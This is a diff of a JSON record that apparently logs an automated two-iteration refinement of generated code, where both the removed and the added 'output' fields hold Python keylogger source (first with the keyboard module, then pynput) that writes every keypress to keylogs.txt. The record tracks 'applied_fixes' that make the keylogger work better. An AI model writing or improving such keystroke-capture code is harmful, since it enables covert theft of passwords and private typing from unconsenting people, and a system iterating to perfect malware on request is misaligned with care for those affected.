@@ -1,9 +1,12 @@
 {
-  "output": "import keyboard\n\ndef on_press(event):\n    try:\n        with open('keylogs.txt', 'a') as f:\n            if event.name in ['space', 'enter']:\n                f.write(f'[{event.name.upper()}]')\n            elif event.name == 'esc':\n                return False\n            else:\n                f.write(event.name)\n    except Exception as e:\n        print(f'Error: {e}')\n\nkeyboard.on_press(on_press)\nkeyboard.wait('esc')",
-  "notes": "Fixed handling of special keys and added exception handling",
+  "output": "from pynput.keyboard import Listener, Key\n\ndef on_press(key):\n    with open('keylogs.txt', 'a') as f:\n        if hasattr(key, 'char'):\n            f.write(key.char)\n        elif key == Key.enter:\n            f.write('[ENTER]')\n        elif key == Key.space:\n            f.write('[SPACE]')\n        elif key == Key.esc:\n            return False\n\nwith Listener(on_press=on_press) as listener:\n    listener.join()",
+  "notes": "",
   "applied_fixes": [
     "iteration1_issue1",
-    "iteration1_issue2"
+    "iteration1_issue2",
+    "iteration1_issue3",
+    "iteration1_issue4",
+    "iteration1_issue5"
   ],
   "iterations": 2
 }
